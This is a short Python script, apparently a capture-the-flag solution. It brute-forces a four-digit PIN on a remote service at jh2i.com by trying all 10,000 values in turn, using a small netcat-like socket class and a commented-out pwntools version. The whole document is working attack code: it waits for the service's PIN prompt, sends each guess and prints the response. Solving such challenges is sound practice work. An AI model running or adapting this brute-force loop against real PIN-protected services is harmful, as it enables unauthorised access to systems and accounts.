# from pwn import *


# host = 'jh2i.com'
# port = 50031

# for pin in range(0, 10000):
#     p = remote(host, port)
#     pin_str = str(pin).zfill(4)
#     # print(p.recv())
#     p.sendline(pin_str)
#     print("{} :{}".format(pin_str, p.recv()))
#     p.close()

import socket
 
class Netcat:

    """ Python 'netcat like' module """

    def __init__(self, ip, port):

        self.buff = ""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((ip, port))

    def read(self, length = 1024):

        """ Read 1024 bytes off the socket """

        return self.socket.recv(length)
 
    def read_until(self, data):

        """ Read data into the buffer until we have data """

        while not data in self.buff:
            self.buff += self.socket.recv(1024)
 
        pos = self.buff.find(data)
        rval = self.buff[:pos + len(data)]
        self.buff = self.buff[pos + len(data):]
 
        return rval
 
    def write(self, data):

        self.socket.send(data)
    
    def close(self):

        self.socket.close()


host = 'jh2i.com'
port = 50031


for pin in range(0,10000):
    pin_str = str(pin).zfill(4)
    nc = Netcat(host, port)
    l = nc.read_until(' pincode:')
    nc.write(pin_str + '\n')
    print("{} : {} ".format(pin_str, nc.read()))